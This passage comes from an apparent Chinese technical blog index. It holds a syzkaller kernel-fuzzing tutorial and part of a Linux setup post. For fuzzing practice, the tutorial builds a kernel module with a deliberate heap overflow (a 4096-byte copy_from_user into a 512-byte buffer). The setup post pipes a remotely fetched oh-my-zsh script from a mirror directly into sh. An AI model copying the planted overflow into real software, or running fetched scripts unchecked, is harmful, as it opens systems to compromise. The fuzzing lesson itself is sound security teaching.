vm.log\n```\n\n对以上各参数我的理解如下：\n\n```\n-kernel xxx/bzImage：用bzImage作为内核镜像，qemu的这个功能用来测试不同内核非常方便。\n-append cmdline：将cmdline作为内核的命令行参数\n-hda xxx/xxx.img：指定xxx.img作为硬盘镜像\n-net user,hostfwd=tcp::10021-:22 -net nic：客户机与宿主机之间通过指定的端口进行通讯\n-enable-kvm：开启kvm虚拟化\n-nographic：非图形界面启动\n-m 2G：分配2G内存给虚拟系统\n-smp 2：指定虚拟机由2个CPU\n-pidfile xxx.pid：将qemu进程pid储存在xxx.pid这个文件中\n2>&1 | tee vm.log：将执行过程中的输出同时定向到标准输出和vm.log文件中\n```\n\n参考了两篇文章：（1）[hostfwd的问题](https://blog.csdn.net/tzwsoho/article/details/80303088) （2）[make 2>&1 | tee log.txt 命令解析](https://blog.csdn.net/Dr_Unknown/article/details/76837708)\n\nqemu启动起来之后，运行ssh测试一下是否连通，便于后期syzkaller运行出错时定位问题。\n\n```shell\nssh -i $IMAGE/stretch.id_rsa -p 10021 -o \"StrictHostKeyChecking no\" root@localhost\n```\n\n曾经有一次连接时在这里出了问题，宿主机上ssh无法连接到虚拟机。原因如下：\n\n由于上一步中create-image.sh中如下eth0跟实际qemu虚拟机中运行的网卡名称不一样，导致网卡没有分配IP地址。最后解决方法如下：qemu启动虚拟机，root用户身份登录后，设置网卡IP地址。\n\n![](syzkaller-ethnet.png)\n\n参考文章：（1）[网卡没分配IP地址的解决方法](https://blog.csdn.net/wuzhong8809/article/details/83374140)（2）[rsa公私钥知识点](https://xuanxuanblingbling.github.io/ctf/web/2019/05/10/rsa/)（3）[一个自己生成公私钥配置的方法](http://embedsec.systems/zh/gnulinux-security/2017/06/05/syzkaller.html)\n\n```shell\n# 关闭qemu虚拟机\nkill $(cat vm.pid)\n```\n\n## 启动syzkaller - qemu\n\n为了使syzkaller运行起来，在syzkaller目录下，新建一个workdir目录，并新建一个config文件用于配置运行所需参数（命名为xxx.cfg）\n\n```shell\nmkdir workdir\n./bin/syz-manager -config=abcd.cfg\n```\n\ncfg文件的格式如下，根据实际情况各参数可做更改：\n\n```\n{\n        \"target\": \"linux/amd64\",\n        \"http\": \"127.0.0.1:56741\",\n        \"workdir\": \"/home/bling/gopath/src/github.com/google/syzkaller/workdir\",\n        \"kernel_obj\": \"/home/bling/linux\",\n        \"image\": \"/home/bling/s_image/stretch.img\",\n        \"sshkey\": \"/home/bling/s_image/stretch.id_rsa\",\n        \"syzkaller\": \"/home/bling/gopath/src/github.com/google/syzkaller/\",\n        \"procs\": 8,\n        \"type\": \"qemu\",\n        \"vm\": {\n                \"count\": 4,\n                \"kernel\": \"/home/bling/linux/arch/x86/boot/bzImage\",\n                \"cpu\": 2,\n                \"mem\": 2048\n        }\n}\n```\n\n执行成功后，如下图所示：\n\n![](syzkaller-running.png)\n\n## 启动syzkaller - isolated\n\n对于两台通过网络连接的独立机器，使用syzkaller进行fuzz时，需要设置ssh连接并更改config配置文件。\n\n> ps. 由于没有两台物理机，这里复用上一步的qemu，不同点在于将虚拟机和物理机看作两台独立运行的机器\n\n可参考如下步骤，先配置好待测试设备，然后再运行syzkaller。\n\n### 配置好待测试设备\n\n在使用syzkaller进行fuzz之前，需要确保目标设备上运行着上一步编译的内核，并且设置好了ssh连接。\n\n可参考官方文档：[setup_linux-host_isolated](https://github.com/google/syzkaller/blob/master/docs/linux/setup_linux-host_isolated.md)\n\n提炼一下，需保证如下几点：\n\n1. **待测试设备上运行着ssh服务**\n\n2. **打开ssh的AllowTcpForwarding选项**\n\n   ```shell\n   ~# grep Forwarding /etc/ssh/sshd_config\n   AllowTcpForwarding yes\n   ```\n\n3. **配置ssh无密码连接**\n\n   ```bash\n   # 在本地生成公私钥对文件\n   ssh-keygen -t rsa\n   # 然后，将公钥文件拷贝到目标测试机器的/root/.ssh/目录下，并重命名为authorized_keys\n   ```\n\n### 运行syzkaller\n\n1. 在本地和目标设备上各创建一个工作目录\n\n   ```bash\n   # 本地：\n   cd syzkaller\n   mkdir workdir\n   # 远端：\n   cd home\n   mkdir fuzzdir\n   ```\n\n2. 在syzkaller目录下新建一个fuzz.cfg文件\n\n   ```xml\n   {\n   \t\"target\": \"linux/amd64\",\n   \t\"http\": \"127.0.0.1:56741\",\n   \t\"rpc\": \"127.0.0.1:0\",\n   \t\"sshkey\" : \"//home/bling/qemu-img/stretch.id_rsa\",\n   \t\"workdir\": \"/home/bling/syzkaller/workdir\",\n   \t\"kernel_obj\": \"/home/bling/linux\",\n   \t\"syzkaller\": \"/home/bling/syzkaller\",\n   \t\"sandbox\": \"setuid\",\n   \t\"type\": \"isolated\",\n   \t\"vm\": {\n   \t\t\"targets\" : [ \"127.0.0.1:10021\" ],\n   \t\t\"pstore\": false,\n   \t\t\"target_dir\" : \"/home/fuzzdir\",\n       \"target_reboot\" : false\n   \t}\n   }\n   ```\n\n   - target指定待测试设备的操作系统内核及cpu架构\n   - vm.targets指定待fuzz设备的ip地址及ssh端口（默认是22）\n   - enbale_syscalls：测试特定的几个系统调用\n   - disable_syscalls：不调用某几个系统调用\n\n   对各个字段的解释，贴两个官方文档：\n\n   [config文件中各字段的解释](https://github.com/google/syzkaller/blob/master/pkg/mgrconfig/config.go)\n\n   [isolated情况下vm字段中参数的解释](https://github.com/google/syzkaller/blob/master/vm/isolated/isolated.go)\n\n   > ps. \"kernel_obj\"删除不指定也是可以的，区别在于无法在web面板中查看代码覆盖率情况\n\n3. 启动syzkaller\n\n   ```\n   ./bin/syz-manager -config=fuzz.cfg\n   ```\n\n\n# 提高fuzz效率\n\nsyzkaller无法根据源码自动分析出有哪些设备节点，也无法获得系统调用及参数信息。如果不针对内核版本进一步定制，那么fuzz效率将非常低。\n\n## 定制syscall description\n\n[syscall descriptions官方说明](https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions.md)\n\nsyzkaller自己定义了一套描述系统调用模版的声明式语言（syzlang），我称之为描述文件/声明文件。\n\n为了提高fuzz效率，我们必须为目标系统量身定制这种声明文件。通常一个设备节点对应一个声明文件。\n\n所谓的声明文件就是一个txt，根据syzkaller定义的语法，在这个txt文档中描述设备节点的接口信息以及参数格式。\n\n### 用syzlang描述系统调用\n\n定制（即对新的内核接口，增加系统调用描述文件）是一个比较繁琐的过程，官方给了如下文档用作参考：\n\n- txt声明文件的语法： [syscall description语法](https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions_syntax.md)\n\n- 一些linux下的syscall description：[现有可参考的声明文件](https://github.com/google/syzkaller/tree/master/sys/linux)\n\n举一个例子，从系统调用open()函数开始，它的函数定义如下：\n\n```c\nint open(const char *pathname, int flags, mode_t mode);\n```\n\n- flags：`O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE`\n- mode：`S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH`\n\n用syzlang来描述它：\n\n```bash\nresource fd_test[fd]\nopen(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode]) fd_test\n# 或\n# open(file ptr[in, string[\"/dev/xxx\"]], flags flags[open_flags], mode flags[open_mode]) fd_test\n```\n\n- `file ptr[in, filename]`：open()函数的第一个参数，命名为file，是一个输入指针类型，指针指向一个文件名字符串\n- `flags flags[open_flags]`：flags表明该参数是open_flags数组中的任意一个值\n  - `open_flags = O_WRONLY, O_RDWR, O_APPEND, ...`\n- `mode flags[open_mode]`：flags表明该参数是open_mode数组中的任意一个值\n  - `open_mode = S_IRUSR, S_IWUSR, S_IXUSR, ...`\n\n- `fd_test`：open()函数的返回值将给fd_test，这是一个文件描述符\n\n`fd_test`将被用于其他系统调用，如read、write、ioctl\n\n```\nread(fd_1 fd_test, buf buffer[out], count len[buf])\nwrite(fd_1 fd_test, buf buffer[in], count len[buf])\n```\n\n- buffer是任意大小的数组空间，填满了int8类型的值。可以是输入参数也可以作为输出参数。\n- len[buf]得到buf的长度\n\nioctl通常承载更多更复杂的功能，syzkaller针对ioctl提供了一种通用的描述方法：\n\n```\nioctl(fd_1 fd_test, cmd intptr, arg buffer[in])\n```\n\n上面这种方式并不准确，为了更精确地触发ioclt中各个case分支，通常需要做额外的适配工作：\n\n```\nioctl$DRM_IOCTL_VERSION(fd fd_dri, cmd const[DRM_IOCTL_VERSION], arg ptr[in, drm_version])\nioctl$VIDIOC_QUERYCAP(fd fd_video, cmd const[VIDIOC_QUERYCAP], arg ptr[out, v4l2_capability])\n...\n```\n\n- `DRM_IOCTL_VERSION`和`VIDIOC_QUERYCAP`是ioctl中的某两个case分支\n\n- `drm_version`和`v4l2_capability`分别是以上两个分支其arg指针指向的结构体（同样需要用syzlang描述）\n\n可以对比如下参考文件，学习基本使用方法：\n\n- /dev/random字符设备\n  - random源码路径：linux/drivers/char/random.c\n  - random描述文件：https://github.com/google/syzkaller/blob/master/sys/linux/dev_random.txt\n\n- /dev/ptmx字符设备\n  - ptmx源码路径：linux/drivers/tty/tty_ioctl.c\n  - ptmx描述文件：https://github.com/google/syzkaller/blob/master/sys/linux/dev_ptmx.txt\n\n### 将描述信息编译进syzkaller\n\n那么，整个定制过程分为4步：\n\n1. 根据目标内核模块的信息，撰写符合syzlang语法的txt声明文件\n2. syz-extract根据txt及linux源码，提取符号常量的值，生成中间文件***.const文件\n3. syz-sysgen根据const文件生成syzkaller执行时使用的go文件\n4. 重新编译syzkaller\n\n如果syzkaller/bin目录下，没有syz-extract和syz-sysgen这两个文件的话，需要执行如下命令编译：\n\n```bash\nmake bin/syz-extract\nmake bin/syz-sysgen\n```\n\n它俩的关系是这样的：\n\n```\n         +-------+            +---------+           +------+\n         |xxx.txt+----------->|xxx.const+---------->|xxx.go|\n         +---+---+            +---------+           +------+\n             |    syz-extract            syz-sysgen    ^\n             |                                         |\n             +-----------------------------------------+\n```\n\n我们针对某个驱动接口写出xxx.txt，然后使用syz-extract利用txt和源码生成const文档，最后执行syz-sysgen时syzkaller会根据txt和const生成一个go文件。可在sys/linux/gen/amd64.go和executor/syscalls.h中看到结果。\n\n\n\n\n\n## 一次定制示例（isolated）\n\n- 编写一个有漏洞的驱动接口，并将其编译进内核（或者使用打ko的方式）。\n- 编写驱动接口对应的txt文件，将其放入syzkaller/sys/linux目录下，生成go文件并重新编译syzkaller。\n- 运行syzkaller，改config文件指定fuzz接口提高速率，最后分析crash。\n\n### 编译进内核\n\n> 方法1：将内核模块编译进内核\n\n#### 一个有漏洞的内核模块\n\n1. 在`kernel_src/drivers/char`目录下，新建一个[testxy.c](testxy.c)。这是一个有漏洞的内核模块，漏洞代码片段如下：\n\n   ```c\n   static ssize_t proc_write (struct file *proc_file, const char __user *proc_user, size_t n, loff_t *loff)\n   {\n       char *c = kmalloc(512, GFP_KERNEL);\n       copy_from_user(c, proc_user, 4096);\n       printk(\":into write!\\n\");\n       return 0;\n   }\n   ```\n\n2. 打开char/目录下的Kconfig文件，添加：\n\n   ```bash\n   config TESTXY_MODULE\n           tristate \"heap overflow test\"\n           default y\n           help\n             This file is to test a buffer overflow\n   ```\n\n3. 打开char/目录下的Makefile文件，添加：\n\n   ```bash\n   obj-$(CONFIG_TESTXY_MODULE) += testxy.o\n   ```\n\n​\t\t若/linux/drivers/char/是新目录，还需修改/linux/drivers/Kconfig（加上source \"drivers/char/Kconfig\"）；修改/linux/drivers/Makefile（加上obj-$(CONFIG_TEST_MODULE) += char/）。\n\n4. make menuconfig时可以在`Device Drivers -> Heap Overflow Test` (*表示直接编入内核，M表示模块形式) 处看到刚刚添加的测试模块。\n\n   ```bash\n   make clean\n   make menuconfig\n   make -j8\n   ```\n\n5. 用新的内核启动虚拟机，查看模块是否加载成功\n\n   ```bash\n   # 查看模块对应设备节点是否存在\n   ls /proc/test1\n   # 查看模块加载时的log信息\n   dmesg | grep \"proc init\"\n   ```\n\n#### 定制txt系统调用描述文件\n\n1. syzkaller源码中，找到sys/linux/目录，新建一个文件，命名为`proc_testxy.txt`，内容如下：\n\n   ```shell\n   include <linux/fs.h>\n   \n   open$testxy(file ptr[in, string[\"/proc/test1\"]], flags flags[proc_open_flags], mode flags[proc_open_mode]) fd\n   read$testxy(fd fd, buf buffer[out], count len[buf]) len[buf]\n   write$testxy(fd fd, buf buffer[in], count len[buf]) len[buf]\n   \n   proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE\n   proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH\n   ```\n\n2. 使用syz-extract生成const文件。指定txt文件名，可单独生成该文件对应的const文件。\n\n   ```shell\n   bin/syz-extract -os linux -arch amd64 -sourcedir \"/home/bling/linux\" proc_testxy.txt\n   ```\n\n3. 运行syz-sysgen\n\n   ```\n   bin/syz-extract\n   ```\n\n4. 重新编译syzkaller\n\n   ```shell\n   make generate\n   make\n   ```\n\n#### 验证能否成功触发crash\n\n启动syzkaller的配置文件如下。为了更快看到crash结果，增加了“enable_syscalls”项，只允许某些系统调用，能更快地触发漏洞。\n\n```\n{\n\t\"target\": \"linux/amd64\",\n\t\"http\": \"127.0.0.1:56741\",\n\t\"rpc\": \"127.0.0.1:0\",\n\t\"sshkey\" : \"//home/bling/qemu-img/stretch.id_rsa\",\n\t\"workdir\": \"/home/bling/syzkaller/workdir\",\n\t\"kernel_obj\": \"/home/bling/linux\",\n\t\"syzkaller\": \"/home/bling/syzkaller\",\n\t\"sandbox\": \"setuid\",\n\t\"type\": \"isolated\",\n\t\"enable_syscalls\":[\n        \t\t\"open$testxy\",\n        \t\t\"read$testxy\",\n        \t\t\"write$testxy\",\n        \t\t\"close$testxy\"\n     ],\n\t\"vm\": {\n\t\t\"targets\" : [ \"127.0.0.1:10021\" ],\n\t\t\"pstore\": false,\n\t\t\"target_dir\" : \"/home/fuzzdir\",\n    \"target_reboot\" : false\n\t}\n}\n```\n\n启动syzkaller进行测试：\n\n```\n./bin/syz-manager -config=abcd.cfg\n```\n\n触发到漏洞分支！（图片跟笔记稍微有点区别，图片是两年前的，笔记是22年更新的）\n\n![](syzkaller-display1.png)\n\n![](syzkaller-display2.png)\n\n![](syzkaller-display3.png)\n\n\n\n### 打ko\n\n> 方法2：insmod方式植入内核模块\n\n源码及makefile文件：[test.c](test.c)和[Makefile](Makefile)。编译完成后，insmod进待fuzz的linux系统中。\n\n通过如下5个步骤完成定制：\n\n1. 在sys/linux/目录下，新建针对目标内核模块的txt声明文件（本例中将其命名为`proc_test.txt`）\n\n   ```\n   include <linux/fs.h>\n   \n   resource fd_111[fd]\n   \n   open$aaa(file ptr[in, string[\"/proc/newtest\"]], flags flags[proc_open_flags], mode flags[proc_open_mode]) fd_111\n   read$aaa(fd_a fd_111, buf buffer[out], count len[buf])\n   write$aaa(fd_a fd_111, buf buffer[in], count len[buf])\n   \n   proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE\n   proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH\n   \n   ```\n\n2. 执行syz-extract\n\n   ```\n   bin/syz-extract -os linux -arch amd64 -sourcedir \"/home/bling/linux\" proc_test.txt\n   ```\n\n   该步骤将在sys/linux/目录下产生一个名为`proc_test.txt.const`的文件\n\n3. 执行syz-sysgen\n\n   ```\n   bin/syz-sysgen\n   ```\n\n   该步骤将更新syzkaller/sys/linux/gen/amd64.go，自动添加上新定义的系统调用，如下片段：\n\n   ```\n   {NR:2,Name:\"open$aaa\",CallName:\"open\",Args:[]Field{\n   {Name:\"file\",Type:Ref(9200)},\n   {Name:\"flags\",Type:Ref(5481)},\n   {Name:\"mode\",Type:Ref(6042)},\n   },Ret:Ref(11058)},\n   \n   {Name:\"read$aaa\",CallName:\"read\",Args:[]Field{\n   {Name:\"fd\",Type:Ref(11058)},\n   {Name:\"buf\",Type:Ref(10466)},\n   {Name:\"count\",Type:Ref(6978)},\n   }},\n   \n   {NR:1,Name:\"write$aaa\",CallName:\"write\",Args:[]Field{\n   {Name:\"fd\",Type:Ref(11058)},\n   {Name:\"buf\",Type:Ref(8697)},\n   {Name:\"count\",Type:Ref(6978)},\n   }},\n   ```\n\n4. 重新编译syzkaller\n\n   ```\n   make generate\n   make\n   ```\n\n5. 指定syscall，重新运行syzkaller\n\n   ```\n   {\n   \t\"target\": \"linux/amd64\",\n   \t\"http\": \"127.0.0.1:56741\",\n   \t\"rpc\": \"127.0.0.1:0\",\n   \t\"sshkey\" : \"//home/bling/qemu-img/stretch.id_rsa\",\n   \t\"workdir\": \"/home/bling/syzkaller/workdir\",\n   \t\"kernel_obj\": \"/home/bling/linux\",\n   \t\"syzkaller\": \"/home/bling/syzkaller\",\n   \t\"sandbox\": \"setuid\",\n   \t\"type\": \"isolated\",\n   \t\"enable_syscalls\": [\"open$aaa\", \"read$aaa\", \"write$aaa\"],\n   \t\"vm\": {\n   \t\t\"targets\" : [ \"127.0.0.1:10021\" ],\n   \t\t\"pstore\": false,\n   \t\t\"target_dir\" : \"/home/fuzzdir\",\n       \"target_reboot\" : true\n   \t}\n   }\n   ```\n\n   执行`./bin/syz-manager -config=abcd.cfg`，开始fuzz。\n\n\n\n# 附录\n\n## 1 安装GCC\n\n> gcc下载地址：[gcc下载](http://ftp.gnu.org/gnu/gcc/)\n\n宿主机自带的gcc版本过低的话，需要在原本的基础上新装一个高版本的gcc。这里我选择源码安装，并且将它安装到一个单独目录，这样今后想卸载的话，直接删除该目录即可。\n\n- 解压gcc-7.4.0源码包：`tar -zxvf gcc-7.4.0.tar.gz`（或者`tar -Jxvf gcc-7.4.0.tar.xz`）\n- 下载安装依赖项：在解压完的源码包中，执行./contrib/download_prerequisites（需更改base_url为http://mirror.linux-ia64.org/gnu/gcc/infrastructure/，如果执行时一直没有进度，考虑加上sudo权限执行）。若执行不成功，则需自行下载安装，步骤如下。\n\n```\ngcc7.4.0依赖的gmp,mpfr和mpc版本如下：\n\tgmp='gmp-6.1.0.tar.bz2'\n\tmpfr='mpfr-3.1.4.tar.bz2'\n\tmpc='mpc-1.0.3.tar.gz'\n\n安装过程参考链接：\nhttps://blog.csdn.net/lwbeyond/article/details/77718040（主要参考该文档）\nhttps://blog.csdn.net/xs1102/article/details/89175293\nhttps://blog.csdn.net/davidhopper/article/details/79681695\n\n安装gmp到configure步骤时，出现“no usable m4”错误：\nhttps://blog.csdn.net/wangqing_12345/article/details/52484723\n```\n\n\n\n## 2 txt文件语法\n\n以ioctl为例，用户态调用规则：\n\n```\nint (*ioctl) (struct inode *inode,struct file *filp,unsigned int cmd,unsigned long arg);\n/*\ninode与filp两个指针对应于应用程序传递的文件描述符fd，这和传递open方法的参数一样。\ncmd 由用户空间直接不经修改的传递给驱动程序\narg 可选。\n*/\n```\n\n定制过程：\n\n1、 分析目标驱动的ioctl函数实现。 2、 找到每个cmd对应的代码块，分析arg的解析过程（结构体）。 3、 把所有这类结构体，按照 syzkaller 的规则写成类似go语言的结构体定义。结构体中如果包含了其他结构体，也都要写上 。 4、 每个cmd码都写成一个ioctl系统调用，以上面的结构体为参数。如：\n\n```\nstatic long ion_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n\tstruct ion_client *client = filp->private_data;\n\tstruct ion_device *dev = client->dev;\n\tstruct ion_handle *cleanup_handle = NULL;\n\tint ret = 0;\n\tunsigned int dir;\n\n\tunion {\n\t\tstruct ion_fd_data fd;\n\t\tstruct ion_allocation_data allocation;\n\t\tstruct ion_handle_data handle;\n\t\tstruct ion_custom_data custom;\n\t} data;\n\n\tdir = ion_ioctl_dir(cmd);\n\n\tif (_IOC_SIZE(cmd) > sizeof(data))\n\t\treturn -EINVAL;\n\n\tif (dir & _IOC_WRITE)\n\t\tif (copy_from_user(&data, (void __user *)arg, _IOC_SIZE(cmd)))\n\t\t\treturn -EFAULT;\n\n\tswitch (cmd) {\n\tcase ION_IOC_ALLOC:\n\t{\n\t\tstruct ion_handle *handle;\n\n\t\thandle = ion_alloc(client, data.allocation.len,\n\t\t\t\t\t\tdata.allocation.align,\n\t\t\t\t\t\tdata.allocation.heap_id_mask,\n\t\t\t\t\t\tdata.allocation.flags);\n\t\tif (IS_ERR(handle))\n\t\t\treturn PTR_ERR(handle);\n\n\t\tdata.allocation.handle = handle->id;\n\n\t\tcleanup_handle = handle;\n\t\tbreak;\n\t}\n\tcase ION_IOC_FREE:\n\t{\n\t\tstruct ion_handle *handle;\n\n\t\thandle = ion_handle_get_by_id(client, data.handle.handle);\n\t\tif (IS_ERR(handle))\n\t\t\treturn PTR_ERR(handle);\n\t\tion_free(client, handle);\n\t\tion_handle_put(handle);\n\t\tbreak;\n\t}\n\tcase ION_IOC_SHARE:\n\tcase ION_IOC_MAP:\n\t{\n\t\tstruct ion_handle *handle;\n\n\t\thandle = ion_handle_get_by_id(client, data.handle.handle);\n\t\tif (IS_ERR(handle))\n\t\t\treturn PTR_ERR(handle);\n\t\tdata.fd.fd = ion_share_dma_buf_fd(client, handle);\n\t\tion_handle_put(handle);\n\t\tif (data.fd.fd < 0)\n\t\t\tret = data.fd.fd;\n\t\tbreak;\n\t}\n\tcase ION_IOC_IMPORT:\n\t{\n\t\tstruct ion_handle *handle;\n\n\t\thandle = ion_import_dma_buf(client, data.fd.fd);\n\t\tif (IS_ERR(handle))\n\t\t\tret = PTR_ERR(handle);\n\t\telse\n\t\t\tdata.handle.handle = handle->id;\n\t\tbreak;\n\t}\n\tcase ION_IOC_SYNC:\n\t{\n\t\tret = ion_sync_for_device(client, data.fd.fd);\n\t\tbreak;\n\t}\n\tcase ION_IOC_CUSTOM:\n\t{\n\t\tif (!dev->custom_ioctl)\n\t\t\treturn -ENOTTY;\n\t\tret = dev->custom_ioctl(client, data.custom.cmd,\n\t\t\t\t\t\tdata.custom.arg);\n\t\tbreak;\n\t}\n\tdefault:\n\t\treturn -ENOTTY;\n\t}\n\n\tif (dir & _IOC_READ) {\n\t\tif (copy_to_user((void __user *)arg, &data, _IOC_SIZE(cmd))) {\n\t\t\tif (cleanup_handle)\n\t\t\t\tion_free(client, cleanup_handle);\n\t\t\treturn -EFAULT;\n\t\t}\n\t}\n\treturn ret;\n}\n```\n\n对应定制的txt：\n\n```\ninclude <asm/ioctl.h>\ninclude <linux/fcntl.h>\ninclude <../drivers/staging/android/uapi/ion.h>\n\nresource fd_ion[fd]\nresource fd_ion_generic[fd]\n\nresource ion_handle[int32]\n\nopenat$ion(fd const[AT_FDCWD], file ptr[in, string[\"/dev/ion\"]], flags flags[open_flags], mode const[0]) fd_ion\nioctl$ION_IOC_ALLOC(fd fd_ion, cmd const[ION_IOC_ALLOC], arg ptr[inout, ion_allocation_data])\nioctl$ION_IOC_FREE(fd fd_ion, cmd const[ION_IOC_FREE], arg ptr[in, ion_handle_data])\nioctl$ION_IOC_MAP(fd fd_ion, cmd const[ION_IOC_MAP], arg ptr[inout, ion_fd_data])\nioctl$ION_IOC_SHARE(fd fd_ion, cmd const[ION_IOC_SHARE], arg ptr[inout, ion_fd_data])\nioctl$ION_IOC_IMPORT(fd fd_ion, cmd const[ION_IOC_IMPORT], arg ptr[inout, ion_fd_data])\nioctl$ION_IOC_SYNC(fd fd_ion, cmd const[ION_IOC_SYNC], arg ptr[inout, ion_fd_data])\nioctl$ION_IOC_CUSTOM(fd fd_ion, cmd const[ION_IOC_CUSTOM], arg ptr[inout, ion_custom_data])\n\nion_allocation_data {\n\tlen\tintptr\n\talign\tintptr\n\theapid\tint32\n\tflags\tint32\n\thandle\tion_handle\n}\n\nion_handle_data {\n\thandle\tion_handle\n}\n\nion_fd_data {\n\thandle\tion_handle\n\tfd\tfd_ion_generic\n}\n\nion_custom_data {\n\tcmd\tint32\n\targ\tintptr\n}\n```\n\n\n\n\n\n# 参考文章推荐\n\n[内核漏洞挖掘技术系列(4)——syzkaller(1)](https://xz.aliyun.com/t/5079?spm=5176.12901015.0.i12901015.3af8525coJ6I6t)\n\n[【漏洞挖掘】使用Syzkaller&QEMU捕捉内核堆溢出Demo](https://www.jianshu.com/p/790b733f80a2)\n\n[Syzkaller Crash Demo](http://pwn4.fun/2019/10/09/Syzkaller-Crash-Demo/)\n\n[从0到1开始使用syzkaller进行Linux内核漏洞挖掘 ](https://bbs.pediy.com/thread-265405.htm#环境搭建过程（吐血踩坑）)\n\n[Using syzkaller, part 1: Fuzzing the Linux kernel](https://www.collabora.com/news-and-blog/blog/2020/03/26/syzkaller-fuzzing-the-kernel/)\n\n[Using syzkaller, part 2: Detecting programming bugs in the Linux kernel](https://www.collabora.com/news-and-blog/blog/2020/04/17/using-syzkaller-to-detect-programming-bugs-in-linux/)\n\n[Linux Kernel Pwn III：使用 syzkaller 进行漏洞挖掘](https://arttnba3.cn/2021/11/24/NOTE-0X06-LINUX-KERNEL-PWN-PART-III/)\n\n[Highlighting syzkaller descriptions syntax with Rouge](https://xairy.io/articles/2021/syzkaller-syntax-highlight)\n\n\n\n","categories":["Fuzzing"]},{"title":"linux releated","url":"/2019/01/01/linux-releated/","content":"\n# ubuntu20.04安装zsh\n\n> 18.04用这个方法也可以成功安装（22/7/3）\n\n\n参考链接：[Ubuntu20.04配置oh-my-zsh以及一些好用的插件](https://m.tqwba.com/x_d/jishu/280778.html)\n\n```bash\nsudo apt install zsh\nchsh -s /bin/zsh\nsh -c \"$(curl -fsSL https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh)\"\n# 到这一步就可以正常使用zsh了，后面的步骤是些花里胡哨的内容，可以不设置\n\ngit clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh}/plugins/zsh-autosuggestions\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh}/plugins/zsh-syntax-highlighting\nsudo apt-get install autojump\nvim ~/.zshrc\n# ## 更改配置文件中的这两项\n# ZSH_THEME=\"ys\"\n# plugins=(git zsh-autosuggestions zsh-syntax-highlighting)\n# ##最后一行加上这个：\n# . /usr/share/autojump/autojump.sh\nsource ~/.zshrc\nreboot\n```\n\n遇到的错误及解决方案：\n\n[smbclient 报错：protocol negotiation failed: NT_STATUS_CONNECTION_RESET](https://blog.csdn.net/u013992330/article/details/107123229)\n\n[Linux：mount命令出现Host is down如何解决](https://www.cnblogs.com/linuxprobe-sarah/p/10807577.html)\n\n\n\n# virtualbox\n\n- 将vdi虚拟机硬盘拷贝给其他人使用\n\n[VBoxManage命令](https://www.virtualbox.org/manual/ch08.html)\n\n```bash\nVBoxManage.exe clonevdi 原始VDI文件 新的VDI文件        # 老旧命令\nVBoxManage.exe clonemedium 原始VDI文件 新的VDI文件    # 新版本命令\nVBoxManage.exe list hdds        # 列出本地已注册的磁盘镜像\nVBoxManage.exe closemedium <uuid|filename>    # 删除某个已注册的磁盘镜像\n```\n\n- mount -t vboxsf时报错\n\n[mount.vboxsf: mounting failed with the error: Invalid argument](https://blog.csdn.net/chenjinshuai/article/details/122411248)\n\n```bash\nsudo apt-get install virtualbox-guest-dkms\n```\n\n[共享文件夹挂载失败的错误：/sbin/mount.vboxsf: mounting failed with the error: No such device](https://www.codeleading.com/article/38724656903/)\n\n```bash\nsudo modprobe -a vboxguest vboxsf vboxvideo\n```\n\n\n\n# ubuntu换内核\n\n\n\n以开启kasan为例，替换ubuntu内核的过程如下：\n\n```bash\n# 下载目标内核源码文件到本地，解压\nwget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.4.tar.gz\ntar -zxf linux-5.4.tar.gz\ncd linux-5.4/\n\n# 拷贝原来的config文件\ncp /boot/config-5.4.0-26-generic ./.config\n\n# 如果是第一次make，需要安装以下组件\nsudo apt install make\nsudo apt install libncurses-dev\nsudo apt install flex\nsudo apt install bison\nsudo apt install libssl-dev\n\n# 进入图形界面，配置Kernel hacking ---> Memory Debugging ---> 选中[*] KASan: runtime memory debugger\nmake menuconfig\n\n# 安装模块和内核，然后重启\nsudo make modules_install\nsudo make install\nreboot\t\t\t# 某些情况下重启后看不到选内核版本的界面，那就继续下一步 - 设置默认启动版本\n\n# 设置编译的内核为默认启动版本\ncat /boot/grub/grub.cfg | grep Ubuntu\t\t# 可以看到类似于\"with Linux xxx.xxx.xxx-xx-generic\"之类的句子\nvim /etc/default/grub\t\t# 设置目标版本到GRUB_DEFAULT字段\n\tGRUB_DEFAULT='Advanced options for Ubuntu>Ubuntu, with Linux 3.14.69'\nsudo update-grub\nsudo reboot\t\t# 重启后系统运行的就是我们编译的内核版本了\n```\n\n\n\n拓展：如果想要关闭KASLR，可以更改`/boot/grub/grub.cfg`，在cmdline位置添加nokaslr，保存文件后直接重启即可。如下\n\n```\n        menuentry 'Ubuntu, with Linux 5.4.0-26-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.4.0-26-generic-advanced-a0e37184-9d79-4234-beca-b50ef9e04936' {\n                recordfail\n                load_video\n                gfxmode 